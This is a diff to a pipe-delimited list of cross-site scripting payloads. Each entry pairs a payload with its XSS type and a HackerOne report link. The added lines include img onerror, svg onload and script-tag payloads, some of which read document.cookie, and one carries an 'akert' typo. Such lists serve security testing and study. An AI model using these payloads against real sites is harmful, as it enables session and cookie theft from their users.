@@ -7,5 +7,11 @@ FA_CERT%27%20onmouseover=alert(1)%20%27%22&||https://hackerone.com/reports/64830
 <script>alert(document.cookie)</script>||https://hackerone.com/reports/192940
 "'><img src=x onerror=alert(1)>|Stored XSS|https://hackerone.com/reports/729424
 ayn%3C/script%3E%3Csvg/onload=alert(document%2edomain)%3E|Reflected XSS|https://hackerone.com/reports/531042
- </script><svg/onload=alert()>|Reflected XSS|https://hackerone.com/reports/531042
- 
+</script><svg/onload=alert()>|Reflected XSS|https://hackerone.com/reports/531042
+Test <img src=x onerror=alert(2)>|Stored XSS|https://hackerone.com/reports/420459
+"></script><script>alert(document.cookie)</script>|Stored XSS|https://hackerone.com/reports/733222
+</script><script>akert(1)</script>|Stored XSS|https://hackerone.com/reports/733222
+#'><img src=x onerror=alert(document.domain)>|DOM XSS|https://hackerone.com/reports/702981
+%27%3E%3Cscript%3Ealert(document.domain)%3C/script%3E|https://hackerone.com/reports/708592
+--><button/autofocus/onfocus=Function("confirm`1`")();//name="XSS|DOM XSS|https://hackerone.com/reports/376027
+
